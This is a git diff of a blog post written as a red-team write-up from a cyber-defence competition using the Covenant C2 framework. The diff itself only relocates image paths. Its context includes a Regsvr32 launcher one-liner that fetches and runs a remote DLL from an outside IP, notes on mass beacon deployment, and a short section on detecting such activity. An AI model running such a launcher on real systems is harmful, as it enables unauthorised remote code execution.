@@ -11,7 +11,7 @@ tags:
     - docker
 comments: true
 published: true
-image: /img/covenant_redteaming/pwnboard_image.png
+image: /img/pwnboard_image.png
 ---
 
 # Using Covenant & Red Teaming 
@@ -44,13 +44,13 @@ ssh'd onto our server it would docker-compose up Elite for them.
 This meant they didn't have to download docker-compose and would make
 things centralized. 
 
-![Plan](/img/covenant_redteaming/plan.png)
+![Plan](/img/plan.png)
 
 
 ### Using Covenant
 Deployment was trivial all we had to do was docker-compose up.
 
-![Easy-Deployment](/img/covenant_redteaming/easy_deployment.png)
+![Easy-Deployment](/img/easy_deployment.png)
 
 In reality we would want to tack on -d when composing Covenant
 to background it. 
@@ -70,7 +70,7 @@ The launcher is just a simple one liner, and the icing on the cake
 is that we can have our server host the dll file instead of having to get that file
 on the target machine.
 
-![Launcher](/img/covenant_redteaming/launcher.png)
+![Launcher](/img/launcher.png)
 
 ```powershell
 regsvr32 /u /s /i:http://129.21.228.140/demo.dll scrobj.dll
@@ -91,7 +91,7 @@ One service that was critical is WinRM to allow us to remotely run
 scripts. Making sure it was running was quite simple with 
 Covenant.
 
-![Restarting_Winrm](/img/covenant_redteaming/example_powershell.png)
+![Restarting_Winrm](/img/example_powershell.png)
 
 Although, in most cases we had those commands in a powershell
 file hosted somewhere so we were able to simply do. 
@@ -138,7 +138,7 @@ One of the most important things is the [pwnboard](https://github.com/micahjmart
 The pwnboard is a visualization to keep track of what we have control of and to
 see what teams are giving us trouble.
 
-![pwnboard-blue](/img/covenant_redteaming/pwnboard.png)
+![pwnboard-blue](/img/pwnboard.png)
 
 To show that you have control of a box is a mere post request with
 json that contains the ip and type of beacon. There is one obvious problem,
@@ -146,7 +146,7 @@ Covenant doesn't automatically do this. That's ok I was planning on
 learning C#. After talking to the developer to figure out where to 
 make the post request to pwnboard whenever a Grunt was created.
 
-![post_req](/img/covenant_redteaming/post_topwnboard.PNG)
+![post_req](/img/post_topwnboard.PNG)
 
 This function is inside Covenant/GruntController.cs, 
 it just does a post request using the Grunt's ip address 
@@ -158,11 +158,11 @@ for all of the boxes as well as the Regsvr32 launcher if possible.
 As we could prebake our stuff I was able to deploy to all of the boxes
 and watch the beacons rain down as well as turn the pwnboard red.
 
-![pwnboard-red](/img/covenant_redteaming/pwnboard_red.PNG)
+![pwnboard-red](/img/pwnboard_red.PNG)
 
 At the start of the competition these are just some of the beacons.
 
-![call_backs](/img/covenant_redteaming/call_backs.PNG)
+![call_backs](/img/call_backs.PNG)
 
 ### Mitigation
 
@@ -172,18 +172,18 @@ is out of the ordinary. For example if you've never seen
 Regsvr32 running on your system before it might be worthwhile
 to investigate and you would be shocked at what you find.
 
-![RegsvrImage](/img/covenant_redteaming/procexp_regsvr.png)
+![RegsvrImage](/img/procexp_regsvr.png)
 
 However, knowing what's going in and out of your network is just as 
 important if you opened wireshark and noticed a lot of http
 traffic that would be highly suspicious.
 For example, if you noticed this http traffic.
 
-![http-traffic](/img/covenant_redteaming/http_traffic.png)
+![http-traffic](/img/http_traffic.png)
 
 Upon noticing this you followed the http stream you would notice this.
 
-![encoded-command](/img/covenant_redteaming/long-command.PNG)
+![encoded-command](/img/long-command.PNG)
 
 ### Take Aways
 
